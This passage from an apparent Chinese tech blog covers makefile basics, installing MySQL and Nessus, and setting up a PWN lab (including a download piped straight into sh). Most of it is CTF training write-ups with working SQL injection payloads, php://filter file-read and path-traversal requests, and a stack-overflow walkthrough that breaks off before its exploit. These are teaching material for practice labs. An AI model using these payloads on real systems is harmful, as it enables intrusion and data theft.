<h2 id="第九章-开发工具"><a href="#第九章-开发工具" class="headerlink" title="第九章 开发工具"></a>第九章 开发工具</h2><h3 id="9-1-make-与-makefile"><a href="#9-1-make-与-makefile" class="headerlink" title="9.1 make 与 makefile"></a>9.1 make 与 makefile</h3><ul>
<li>作用：控制源代码的编译（make 命令会根据 makefile 文件确定目标文件的创建顺序以及正确的规则调用顺序）</li>
</ul>
<h4 id="9-1-1-make-命令的选项"><a href="#9-1-1-make-命令的选项" class="headerlink" title="9.1.1 make 命令的选项"></a>9.1.1 make 命令的选项</h4><ul>
<li><code>-k</code>：遇到错误也继续执行</li>
<li><code>-n</code>：输出将要执行的下一步操作</li>
<li><code>-f &lt;filename&gt;</code>：告诉 make 将哪个文件作为 makefile<ul>
<li>如果不存在这个选项，make 会先找名为 makefile 的文件，不存在就再找 Makefile</li>
</ul>
</li>
</ul>
<h4 id="9-1-2-依赖关系的写法"><a href="#9-1-2-依赖关系的写法" class="headerlink" title="9.1.2 依赖关系的写法"></a>9.1.2 依赖关系的写法</h4><p><code>目标名称: 依赖的文件列表</code></p>
<ul>
<li><p>举例：</p>
<p>最终的程序 myapp 依赖 main.o 2.o 3.o；main.o 依赖 main.c a.h；2.o 依赖 2.c a.h b.h，3.o 依赖 3.c b.h c.h。</p>
<p>所以 main.o 受 main.c 和 a.h 影响，这两个文件修改了都要重新编译 main.c 以重建 main.o</p>
</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">myapp: main.o 2.o 3.o</span></span><br><span class="line"><span class="section">main.o: main.c a.h</span></span><br><span class="line"><span class="section">2.o: 2.c a.h b.h</span></span><br><span class="line"><span class="section">3.o: 3.c b.h c.h</span></span><br></pre></td></tr></table></figure>
<h4 id="9-1-3-编写规则"><a href="#9-1-3-编写规则" class="headerlink" title="9.1.3 编写规则"></a>9.1.3 编写规则</h4><font face="楷体" color="red">注意：makefile 中空格和制表符是有区别的</font>

<ul>
<li>规则所在行必须以<strong>制表符</strong>开头</li>
<li>makefile 中的行不能以空格结尾</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">myapp: main.o 2.o 3.o</span></span><br><span class="line">	gcc -o myapp main.o 2.o 3.o</span><br><span class="line"><span class="section">main.o: main.c a.h</span></span><br><span class="line">	gcc -c main.c</span><br><span class="line"><span class="section">2.o: 2.c a.h b.h</span></span><br><span class="line">	gcc -c 2.c</span><br><span class="line"><span class="section">3.o: 3.c b.h c.h</span></span><br><span class="line">	gcc -c 3.c</span><br></pre></td></tr></table></figure>
<h4 id="9-1-4-makefile-中的宏"><a href="#9-1-4-makefile-中的宏" class="headerlink" title="9.1.4 makefile 中的宏"></a>9.1.4 makefile 中的宏</h4><p>makefile 文件中的宏通常被用于设置编译器的选项、头文件目录等</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">all: myapp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Which compiler</span></span><br><span class="line">CC = gcc</span><br><span class="line"></span><br><span class="line"><span class="comment"># Where are include files kept</span></span><br><span class="line">INCLUDE = .</span><br><span class="line"></span><br><span class="line"><span class="section">myapp: main.o 2.o 3.o</span></span><br><span class="line">	<span class="variable">$(CC)</span> -o myapp main.o 2.o 3.o</span><br><span class="line">	</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h4 id="9-1-5-makefile-中的特殊字符"><a href="#9-1-5-makefile-中的特殊字符" class="headerlink" title="9.1.5 makefile 中的特殊字符"></a>9.1.5 makefile 中的特殊字符</h4><ul>
<li><code>-</code>：告诉 make 命令忽略所有错误</li>
<li><code>@</code>：告诉 make 在执行某条命令之前不要将该命令显示在标准输出上</li>
</ul>
<h2 id="第十一章-进程和信号"><a href="#第十一章-进程和信号" class="headerlink" title="第十一章 进程和信号"></a>第十一章 进程和信号</h2>]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL的安装与重新安装</title>
    <url>/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="1-下载安装-MySQL-1"><a href="#1-下载安装-MySQL-1" class="headerlink" title="1 下载安装 MySQL[1]"></a>1 下载安装 MySQL[1]</h2><ul>
<li><a href="https://dev.mysql.com/downloads/mysql/">下载地址</a> </li>
<li>解压缩，并进入目录，新建 my.ini 配置文件，内容如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[client]</span><br><span class="line"># 设置mysql客户端默认字符集</span><br><span class="line">default-character-set=utf8</span><br><span class="line"> </span><br><span class="line">[mysqld]</span><br><span class="line"># 设置3306端口</span><br><span class="line">port = 3306</span><br><span class="line"># 设置mysql的安装目录</span><br><span class="line">basedir=D:\mysql-8.0.24-winx64</span><br><span class="line"># 允许最大连接数</span><br><span class="line">max_connections=20</span><br><span class="line"># 服务端使用的字符集默认为8比特编码的latin1字符集</span><br><span class="line">character-set-server=utf8</span><br><span class="line"># 创建新表时将使用的默认存储引擎</span><br><span class="line">default-storage-engine=INNODB</span><br></pre></td></tr></table></figure>
<ul>
<li>进入 bin 目录，初始化数据库 <code>mysqld --initialize --console</code> ，完成后得到初始密码 <code>Jm&gt;)=CuKn2ss</code> </li>
</ul>
<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1618907983989-09269ece-956b-4449-96df-9dc4ffc0eeba.png" alt="img"></p>
<ul>
<li><strong>安装：</strong> <code>mysqld install</code>（ 注意需要以管理员身份打开 cmd，否则执行该命令时会报 <code>Install/Remove of the Service Denied!</code> ）</li>
</ul>
<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1618908295769-1dc4acc4-da15-4405-85e5-cb105662c403.png" alt="img"></p>
<h2 id="2-启动与登录"><a href="#2-启动与登录" class="headerlink" title="2 启动与登录"></a>2 启动与登录</h2><ul>
<li><strong>启动：</strong><code>net start mysql</code> （同理 <code>net stop mysql</code> 可停止服务）（管理员身份）</li>
</ul>
<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1618908335828-17e2ab74-3c3f-4e23-be53-b53b206daf38.png" alt="img"></p>
<ul>
<li><p><strong>登录</strong></p>
<ul>
<li>登录本地：<code>mysql -u root -p</code> 然后输入上文得到的初始密码即可</li>
</ul>
</li>
<li><p><strong>注意：</strong>个人经验，最好在服务中将 MySQL 设置为手动（先命令行 net stop mysql 再将服务调整为手动）</p>
</li>
</ul>
<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1621566205760-ead873af-6ad2-4029-b595-34f75f0a1c7b.png" alt="img"></p>
<h2 id="3-修改登录密码-2"><a href="#3-修改登录密码-2" class="headerlink" title="3 修改登录密码[2]"></a>3 修改登录密码[2]</h2><ul>
<li><strong>注意：这里在配置文件中添加的参数可能会导致关闭服务后就无法再启动服务了。所以不要按以下步骤修改密码</strong><ul>
<li><strong>启动服务 net start mysql (不能先停止服务再修改 ini 配置，否则会无法启动)</strong></li>
<li><strong>修改 ini</strong></li>
<li><strong>登录本地 MySQL</strong></li>
<li><strong>修改密码，退出登录</strong></li>
<li><strong>关闭服务 net stop mysql</strong></li>
<li><strong>删除此前添加的有关密码</strong></li>
</ul>
</li>
</ul>
<p>以上步骤完成后，启动服务发现修改后的密码可以使用了。更具体的部分细节如下</p>
<ul>
<li>修改配置文件 my.ini：在文件末尾追加两行参数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 添加密码验证插件</span><br><span class="line">plugin-load-add=validate_password.so</span><br><span class="line">#服务器在启动时加载插件，并防止在服务器运行时删除插件</span><br><span class="line">validate-password=FORCE_PLUS_PERMANENT</span><br></pre></td></tr></table></figure>
<ul>
<li>root 登录本地 MySQL <code>mysql -u root -p</code> </li>
<li>将密码修改为 0000 </li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified by &#x27;0000&#x27;;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1618910278709-526302e4-0e37-452c-a7ce-7c55df2a3c7e.png" alt="img"></p>
<ul>
<li>修改成功</li>
</ul>
<h2 id="4-关于重新安装"><a href="#4-关于重新安装" class="headerlink" title="4  关于重新安装"></a>4  关于重新安装</h2><ul>
<li>删除 MySQL 服务 <code>sc delete mysql</code></li>
<li>删除原先的 MySQL 目录，解压缩 zip 文件重新安装（上文步骤）</li>
</ul>
<p>如果还不能正常安装，参考下文方法</p>
<ul>
<li>某日发现不能正常启动 MySQL 服务，遂前往服务查看，当手动启动 MySQL 服务时会报错。故只得将<a href="https://blog.csdn.net/weixin_45450428/article/details/104643956?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-0&amp;spm=1001.2101.3001.4242">原有 MySQL 文件和注册表中信息删除</a></li>
<li>但重新解压安装包，进行初始化时，会报错。解决方案也在其中，遂将 ini 文件中相关信息进行修改</li>
</ul>
<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1619596939296-f8a921ef-80f3-4095-9d81-bda8ca98900b.png" alt="img"></p>
<p><img src="/2021/05/27/MySQL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85/1619597004542-fd7661f2-7bf7-4b59-89a0-d53475b7e85b.png" alt="img"></p>
<ul>
<li>然后<strong>将 data 目录删除</strong>，即可正常初始化</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://www.runoob.com/mysql/mysql-install.html">https://www.runoob.com/mysql/mysql-install.html</a></li>
<li><a href="https://blog.csdn.net/qq_44792624/article/details/107426590">https://blog.csdn.net/qq_44792624/article/details/107426590</a></li>
</ol>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Nessus安装</title>
    <url>/2021/01/20/Nessus%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><a href="https://blog.csdn.net/nex1less/article/details/88407590">参考</a>  </p>
<ol>
<li>从<a href="http://www.tenable.com/products/nessus/select-your-operating-system">官网</a>下载对应版本的Nessus，这里下载的是Nessus-8.13.1-debian6_amd64.deb  </li>
<li><code>dpkg -i Nessus-8.13.1-debian6_amd64.deb</code>  </li>
<li>安装完成后提示<br><img src="/2021/01/20/Nessus%E5%AE%89%E8%A3%85/000Nessus_install_finished.png" alt>  </li>
<li>故通过<code>/bin/systemctl start nessusd.service</code>启动  </li>
<li>查看Nessus启动状态（下图为启动成功）<code>netstat -ntpl | grep nessus</code><br><img src="/2021/01/20/Nessus%E5%AE%89%E8%A3%85/002netstat.png" alt>  </li>
</ol>
<h2 id="注册与初始化"><a href="#注册与初始化" class="headerlink" title="注册与初始化"></a>注册与初始化</h2><ol>
<li><a href="http://www.tenable.com/products/nessus/nessus-plugins/obtain-an-activation-code">http://www.tenable.com/products/nessus/nessus-plugins/obtain-an-activation-code</a>  </li>
<li>这里注册免费的Nessus Essential  </li>
<li>获取邮箱收到的激活码  </li>
<li>启动页通过浏览器查看<a href="https://kali:8834/">https://kali:8834/</a><br><img src="/2021/01/20/Nessus%E5%AE%89%E8%A3%85/001Nessus_browser_ui.png" alt>  </li>
<li>选择注册版本，并填写激活码<br><img src="/2021/01/20/Nessus%E5%AE%89%E8%A3%85/003license.png" alt>  </li>
<li>这里遇到了一个问题，网络断开，重启网络<code>systemctl restart networking</code>不管用。<code>ifconfig</code>发现ip地址只有127.0.0.1，于是<code>sudo dhclient eth0</code>，随即恢复 <a href="https://unix.stackexchange.com/questions/178399/no-longer-able-to-reach-the-internet-on-kali-linux">参考</a>  </li>
<li>随后要求注册账号，填写用户名和密码，即可开始初始化过程<br><img src="/2021/01/20/Nessus%E5%AE%89%E8%A3%85/004initialing.png" alt>  </li>
<li>在线下载很慢，于是<a href="https://blog.csdn.net/robacco/article/details/89575849">离线下载</a>  </li>
</ol>
<h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><p><a href="https://blog.csdn.net/Fish_cyy/article/details/105797084">参考</a>  </p>
<h2 id="切换root用户"><a href="#切换root用户" class="headerlink" title="切换root用户"></a>切换root用户</h2><p><code>sudo passwd root</code>给root添加密码即可</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Nessus</tag>
        <tag>安全工具</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN分析环境搭建</title>
    <url>/2021/05/31/PWN%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p><a href="http://mirrors.163.com/ubuntu-releases/16.04/">http://mirrors.163.com/ubuntu-releases/16.04/</a> 这里下载 ubuntu-16.04.7-desktop-amd64.iso </p>
<ul>
<li>注意先建空白盘</li>
</ul>
<p><img src="/2021/05/31/PWN%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20210531154505963.png" alt="image-20210531154505963"></p>
<ul>
<li><p>建好后再通过设置，添加 ISO 映像文件</p>
<p><img src="/2021/05/31/PWN%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20210531154636268.png" alt="image-20210531154636268"></p>
</li>
<li><p>然后再启动虚拟机开始安装</p>
</li>
</ul>
<h2 id="二进制安全研究工具"><a href="#二进制安全研究工具" class="headerlink" title="二进制安全研究工具"></a>二进制安全研究工具</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt update &amp;&amp; sudo apt upgrade</span><br><span class="line">sudo apt install libc6:i386</span><br><span class="line"></span><br><span class="line">sudo apt install gcc-4.8 cmake gdb socat vim</span><br><span class="line">sudo apt install python-dev python-pip python3 python3-dev python3-pip</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里我是分步用 sudo python -m pip install 安装的</span></span><br><span class="line">sudo pip install zio pwntools ropgadget capstone keystone-engine unicorn</span><br><span class="line">wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh</span><br><span class="line">sudo wget https://github.com/slimm609/checksec.sh/raw/master/checksec -O /usr/local/bin/checksec &amp;&amp; sudo chmod +x /usr/local/bin/checksec</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>N1BOOK</title>
    <url>/2020/11/11/N1BOOK/</url>
    <content><![CDATA[<font face="楷体" size="4">参考《从0到1 CTFer成长之路》</font>  

<h2 id="第一章-web入门-常见的搜集"><a href="#第一章-web入门-常见的搜集" class="headerlink" title="[第一章 web入门]常见的搜集"></a>[第一章 web入门]常见的搜集</h2><h3 id="先验知识：常见的敏感文件"><a href="#先验知识：常见的敏感文件" class="headerlink" title="先验知识：常见的敏感文件"></a>先验知识：常见的敏感文件</h3><ol>
<li>gedit备份文件，格式为<code>filename~</code>，比如<code>index.php~</code>  </li>
<li>vim备份文件，格式为<code>.filename.swp</code>或者<code>*.swo</code>或者<code>*.swn</code>，比如<code>.index.php.swp</code>  </li>
<li>robots.txt  </li>
<li>还有<code>filename.bak</code>文件</li>
</ol>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ol>
<li><p>地址后加<code>/index.php~</code>    </p>
<p><img src="/2020/11/11/N1BOOK/1931211-20201109223222659-122979701.png" alt="img"></p>
</li>
<li><p><code>/.index.php.swp</code>会即刻下载备份文件，可通过<code>vi index.php</code>建一个只有空格的文件，然后通过<code>vim -r index.php</code>进行恢复即可得到<br> <img src="/2020/11/11/N1BOOK/1931211-20201109225055125-364536216.png" alt="img"></p>
</li>
<li><p><code>/robots.txt</code><br> <img src="/2020/11/11/N1BOOK/1931211-20201109224118439-1125637828.png" alt="img"><br> 查看这个文本文件  </p>
<p><img src="/2020/11/11/N1BOOK/1931211-20201109224223273-908316035.png" alt="img"></p>
<p>综上可得  </p>
</li>
</ol>
<blockquote>
<p>n1book{info_1s_v3ry_imp0rtant_hack}</p>
</blockquote>
<h2 id="第一章-web入门-粗心的小李"><a href="#第一章-web入门-粗心的小李" class="headerlink" title="[第一章 web入门]粗心的小李"></a>[第一章 web入门]粗心的小李</h2><p>git泄露 </p>
<p><img src="/2020/11/11/N1BOOK/1931211-20201109172615955-1966111900.png" alt="img"></p>
<h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><ol>
<li>借助<a href="https://github.com/WangYihang/GitHacker">GitHacker工具</a>  </li>
<li><code>git clone https://github.com/WangYihang/GitHacker.git</code>  </li>
<li><code>cd GitHacker</code>  </li>
<li><code>python Githacker.py http://0fcbe3ec-471a-452a-9e5f-953c5026eb18.node3.buuoj.cn/.git</code><br><img src="/2020/11/11/N1BOOK/1931211-20201109222425300-439745981.png" alt="img">  </li>
<li>进入恢复后的文件夹<code>cd 0fcbe3ec-471a-452a-9e5f-953c5026eb18_node3_buuoj_cn_</code>，有个index.html<br><img src="/2020/11/11/N1BOOK/1931211-20201109222705671-1100399964.png" alt="img">  </li>
<li>浏览器打开index.html即可拿到flag<br><img src="/2020/11/11/N1BOOK/1931211-20201109222803648-1320351443.png" alt="img"><blockquote>
<p>n1book{git_looks_s0_easyfun}</p>
</blockquote>
</li>
</ol>
<h2 id="第一章-web入门-SQL注入-1"><a href="#第一章-web入门-SQL注入-1" class="headerlink" title="[第一章 web入门]SQL注入-1"></a>[第一章 web入门]SQL注入-1</h2><ol>
<li>打开题目链接可以看到<br><img src="/2020/11/11/N1BOOK/1931211-20201111105652234-783984521.png" alt="img"></li>
<li>试试<code>id=1+1</code>的回显，发现和<code>id=1</code>结果相同，所以不是数字型注入，可能是字符型<br><img src="/2020/11/11/N1BOOK/1931211-20201111110017446-1664980143.png" alt="img"></li>
<li>尝试<code>id=1a</code>发现和<code>id=1</code>结果相同，所以确实是字符型<br><img src="/2020/11/11/N1BOOK/1931211-20201111110249600-1227706058.png" alt="img"></li>
<li>尝试用<code>id=1&#39;#</code>，单引号用于闭合前面的单引号，井号用于注释后面预置的单引号。这里<font face="楷体" color="red">注意：#一定要用URL编码，即%23</font>，所以实际上需要输入<code>id=1&#39;%23</code>单引号会被自动转成%27<br><img src="/2020/11/11/N1BOOK/1931211-20201111111203589-1163518685.png" alt="img"></li>
<li>可以成功显示  </li>
<li>优先尝试UNION注入<code>id=-1&#39;union select 1,2,3%23</code>，其中-1是为了使第一行记录无法被查询到，当然，除了-1也可以是一个很大的值比如1024、100等。后面的查询语句是尝试测试哪些字段可以回显<a href="https://blog.csdn.net/weixin_44840696/article/details/89166154">参考</a><br><img src="/2020/11/11/N1BOOK/1931211-20201111112032432-1319004183.png" alt="img"></li>
<li>所以将数字2改成我们想查询的内容：所有表名<code>group_concat(table_name)</code>，<code>group_concat</code>是用<code>,</code>联合多行记录的函数。所以为查询本数据库的其他所有表名，需<code>id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</code>，随即看到fl4g<br><img src="/2020/11/11/N1BOOK/1931211-20201111112630199-158278303.png" alt="img"></li>
<li>查询fl4g中的字段名，<code>id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;fl4g&#39;%23</code><br><img src="/2020/11/11/N1BOOK/1931211-20201111113011837-1925798496.png" alt="img"></li>
<li>获取fllllag的内容，<code>id=-1&#39;union select 1,fllllag,3 from fl4g%23</code><br><img src="/2020/11/11/N1BOOK/1931211-20201111113143857-1970053562.png" alt="img"><blockquote>
<p>n1book{union_select_is_so_cool}</p>
</blockquote>
</li>
</ol>
<h2 id="第一章-web入门-SQL注入-2"><a href="#第一章-web入门-SQL注入-2" class="headerlink" title="[第一章 web入门]SQL注入-2"></a>[第一章 web入门]SQL注入-2</h2><h3 id="先验知识"><a href="#先验知识" class="headerlink" title="先验知识"></a>先验知识</h3><ol>
<li>有的网站会开启错误调试信息方便开发者调试，可以利用报错信息进行<strong>报错注入</strong>  </li>
<li>updatexml第二个参数应为合法XPATH路径，否则会在引发报错的同时输出传入的参数  </li>
<li>dual用于测试数据库是否可以正常使用  </li>
</ol>
<h3 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h3><ol>
<li><p>在连接后加上<code>/login.php</code>，右键查看源码<br> <img src="/2020/11/11/N1BOOK/1931211-20201114180246608-43938250.png" alt="img"></p>
<p><img src="/2020/11/11/N1BOOK/1931211-20201114175943865-1170585348.png" alt="img">  </p>
</li>
<li><p>回到登录页面，打开Burp Suite，安装方法<a href="https://www.pianshen.com/article/8533363563/#20_Burp_Suite__57">参考</a>  </p>
</li>
<li><p>推荐浏览器插件：SwitchyOmega，可以省去每次设置代理的步骤，使用BurpSuite时，点击插件选择对应Burp Suite的代理即可<br> <img src="/2020/11/11/N1BOOK/1931211-20201122233423320-7334493.png" alt="img">  </p>
</li>
<li><p>在login界面随便输入用户名和密码如1,1然后点击登录  </p>
</li>
<li><p>可以在Burp Suite中Proxy-&gt;HTTP history看到记录<br> <img src="/2020/11/11/N1BOOK/1931211-20201122234140730-1675769603.png" alt="img">  </p>
</li>
<li><p>CTRL+R，发送到Repeater，在login.php后添加<code>?tips=1</code>，点击Go，看到报错<br> <img src="/2020/11/11/N1BOOK/1931211-20201122234308612-2127113186.png" alt="img">  </p>
</li>
<li><p>用dual进行测试<code>name=1&#39;and updatexml(1,concat(0x7e,(select 1 from dual)),1)#&amp;pass=xxxx</code><br> <img src="/2020/11/11/N1BOOK/1931211-20201122235414244-1226071747.png" alt="img">  </p>
</li>
<li><p>说明存在过滤，将select改成selEct重新发送后回显正常<br> <img src="/2020/11/11/N1BOOK/1931211-20201122235551248-284421726.png" alt="img">  </p>
</li>
<li><p>之后的操作与与SQL注入1同理，将selEct后的1改为group_concat(table_name)，dual改为information_schema.tables where table_schema=database()以查看所有表名<br> <img src="/2020/11/11/N1BOOK/1931211-20201122235936482-283322537.png" alt="img">  </p>
</li>
<li><p>仍与SQL注入1同理，查看fl4g的字段，分别改为group_concat(column_name)和information_schema.columns where table_name=’fl4g’<br><img src="/2020/11/11/N1BOOK/1931211-20201123000206027-1673938152.png" alt="img">  </p>
</li>
<li><p>获取flag，<code>selEct flag from fl4g</code><br><img src="/2020/11/11/N1BOOK/1931211-20201123000312454-163132210.png" alt="img">  </p>
<blockquote>
<p>n1book{login_sqli_is_nice}</p>
</blockquote>
</li>
</ol>
<h2 id="第一章-web入门-afr-1"><a href="#第一章-web入门-afr-1" class="headerlink" title="[第一章 web入门]afr_1"></a>[第一章 web入门]afr_1</h2><h3 id="先验知识-1"><a href="#先验知识-1" class="headerlink" title="先验知识"></a>先验知识</h3><ol>
<li>PHP向用户提供的指定待打开文件的方式，是一个文件流  </li>
<li>PHP的Filter机制，可对目前的协议进行一定的处理，比如将当前文件流的内容进行Base64编码。使用方法<code>php://filter/read=convert.base64-encode/resource=xxx</code>  </li>
<li>利用Filter机制，构造形如以上的攻击数据可以读取文件，拿到各种文件的源码  </li>
</ol>
<h3 id="方法-3"><a href="#方法-3" class="headerlink" title="方法"></a>方法</h3><ol>
<li>点击题目链接<br><img src="/2020/11/11/N1BOOK/1931211-20201115180608275-1525964878.png" alt="img">  </li>
<li><code>p=php://filter/read=convert.base64-encode/resource=hello</code><br><img src="/2020/11/11/N1BOOK/1931211-20201115181019047-1546308797.png" alt="img">  <blockquote>
<p>PD9waHAKCmVjaG8gImhlbGxvIHdvcmxkISI7</p>
</blockquote>
</li>
</ol>
<p><a href="https://tool.oschina.net/encrypt?type=3">Base64解码</a>结果为  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello world!&quot;</span>;</span><br></pre></td></tr></table></figure>
<ol>
<li>尝试改p，发现<code>p=flag</code>时有回显，所以应该存在这么个文件<br><img src="/2020/11/11/N1BOOK/1931211-20201115180652404-1677628879.png" alt="img">  </li>
<li><p><code>p=php://filter/read=convert.base64-encode/resource=flag</code><br><img src="/2020/11/11/N1BOOK/1931211-20201115181356049-426897552.png" alt="img">  </p>
<blockquote>
<p>PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9</p>
</blockquote>
</li>
<li><p>解码结果为  </p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;no no no&#x27;</span>);</span><br><span class="line"><span class="comment">//n1book&#123;afr_1_solved&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="第一章-web入门-afr-2"><a href="#第一章-web入门-afr-2" class="headerlink" title="[第一章 web入门]afr_2"></a>[第一章 web入门]afr_2</h2><h3 id="先验知识-2"><a href="#先验知识-2" class="headerlink" title="先验知识"></a>先验知识</h3><p>Nginx错误配置可能产生目录穿越漏洞，比如：  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">location /<span class="keyword">static</span> &#123;</span><br><span class="line">    alias /home/myapp/<span class="keyword">static</span>/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于static后没有加/，如果用户请求/static../，拼接到alias进会变成/home/myapp/static/../会穿越到myapp目录  </p>
<h3 id="方法-4"><a href="#方法-4" class="headerlink" title="方法"></a>方法</h3><ol>
<li>点击题目链接<br><img src="/2020/11/11/N1BOOK/1931211-20201115235618945-1220381986.png" alt="img"> </li>
<li>右键查看源码<br><img src="/2020/11/11/N1BOOK/1931211-20201115235644275-1101729838.png" alt="img">  </li>
<li>查看img目录<br><img src="/2020/11/11/N1BOOK/1931211-20201115235800682-1951172374.png" alt="img">  </li>
<li>目录穿越<br><img src="/2020/11/11/N1BOOK/1931211-20201115235824630-1004736249.png" alt="img">  </li>
<li>下载flag，用记事本打开即可  <blockquote>
<p>n1book{afr_2_solved}</p>
</blockquote>
</li>
</ol>
<h2 id="第五章-CTF之RE章-Hello-RE"><a href="#第五章-CTF之RE章-Hello-RE" class="headerlink" title="[第五章 CTF之RE章]Hello, RE"></a>[第五章 CTF之RE章]Hello, RE</h2><p>直接拖到ida64反编译即可看到flag<br><img src="/2020/11/11/N1BOOK/1931211-20201111115333510-1380860265.png" alt="img">  </p>
<blockquote>
<p>n1book{Welcome_to_reversing_world!}  </p>
</blockquote>
<h2 id="第六章-CTF之PWN章-stack"><a href="#第六章-CTF之PWN章-stack" class="headerlink" title="[第六章 CTF之PWN章]stack"></a>[第六章 CTF之PWN章]stack</h2><p>题目提供了libc-2.27.so和stack，根据经验知道这题环境是Ubuntu18，需要进行堆栈平衡  </p>
<ol>
<li><code>checksec stack</code><br><img src="/2020/11/11/N1BOOK/1931211-20201111204026170-317361439.png" alt="img">  </li>
<li>IDA64反编译，并查看<code>main</code>函数  </li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>进一步查看<code>vuln</code>，发现栈溢出漏洞<br> <img src="/2020/11/11/N1BOOK/1931211-20201111204429141-497488314.png" alt="img">  </p>
</li>
<li><p>双击变量<code>v1</code>查看栈信息，所以当覆盖<code>&#39;a&#39;*18</code>后即可到达函数返回地址<br> <img src="/2020/11/11/N1BOOK/1931211-20201111204527280-1969476305.png" alt="img">  </p>
</li>
<li><p>同时注意到IDA64的函数窗口有个<code>shell</code>，查看以下发现<br> <img src="/2020/11/11/N1BOOK/1931211-20201111204818419-1089495331.png" alt="img"> </p>
</li>
<li><p>所以需要将<code>shell</code>的地址0x覆盖到<code>vuln</code>的返回地址即可。由于前面提到需要堆栈平衡，我们还要知道shell的ret地址<br> <img src="/2020/11/11/N1BOOK/1931211-20201111205501285-1592593146.png" alt="img"></p>
<p><img src="/2020/11/11/N1BOOK/1931211-20201111205403033-1732093910.png" alt="img">  </p>
</li>
<li><p>综上，有exp如下  </p>
</li>
</ol>
